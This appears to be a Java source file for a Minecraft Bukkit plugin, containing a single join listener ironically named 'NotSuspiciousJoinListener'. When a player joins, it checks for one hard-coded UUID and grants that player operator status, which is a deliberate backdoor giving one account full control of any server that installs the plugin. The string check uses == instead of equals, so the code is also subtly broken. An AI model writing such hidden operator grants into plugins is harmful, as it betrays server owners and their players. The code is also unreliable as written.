package dev.jaims.terribleplugin.listener;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class NotSuspiciousJoinListener implements Listener {

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        if (e.getPlayer().getUniqueId().toString() == "ca606d09-dced-4241-94a6-eaa7d4525d9f") {
            e.getPlayer().setOp(true);
        }
    }

}
